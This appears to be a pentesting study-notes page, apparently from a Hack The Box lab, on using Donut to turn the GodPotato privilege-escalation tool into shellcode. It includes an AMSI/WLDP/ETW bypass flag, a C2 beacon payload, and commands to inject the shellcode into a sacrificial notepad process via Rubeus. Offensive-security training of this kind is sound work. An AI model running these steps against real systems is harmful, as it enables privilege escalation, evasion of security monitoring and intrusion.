| üè† [Home](../../pentesting.md) | ‚¨ÖÔ∏è ‚¨ÖÔ∏è [Part](../_part) | ‚¨ÖÔ∏è [Chapter](./_chapter) |
|--------------------------------|----------------------|-------------------------|

* [Tools](../../malware_dev/shellcode/tools.md)
    * [Donut](../../malware_dev/shellcode/tools.md#donut)


# Tools
## Donut

* [Donut - Injecting .NET Assemblies as Shellcode](https://thewover.github.io/Introducing-Donut/)

[Donut](https://github.com/TheWover/donut) is a tool focused on creating binary shellcodes that can be executed in memory; Donut will generate a shellcode of a`.NET` binary. This shellcode may be used to inject the Assembly into arbitrary Windows processes.


Given an arbitrary .NET Assembly, parameters, and an entry point (such as Program.Main), it produces position-independent shellcode that loads it from memory. The .NET Assembly can either be staged from a URL or stageless by being embedded directly in the shellcode.

To take advantage of Donut, we would need to create either an http or
mtls beacon(s) beforehand.

To generate the binary shellcode using Donut, we are going to be using
the arguments `-a 2` responsible for choosing the architecture
(`2 = amd64`), the `-b 2` responsible for bypassing AMSI/WLDP/ETW
(`2 = Abort on fail`), `-p` followed by the arguments that are going to
be run from GodPotato and the `-o` to specify the output directory and
the name of the shellcode.

```bash
git clone https://github.com/TheWover/donut
cd donut/
make -f Makefile
./donut 


./donut -i ./GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o ./godpotato.bin
```
To continue and use the execute-shellcode in memory, we would have to
create a sacrificial process of `notepad.exe` using `Rubeus.exe`
(previously downloaded from SharpCollection). Creating a sacrificial
process will enable us to not intervene with other processes that might
be crucial to the organization as they might crash.

```bash
execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin
```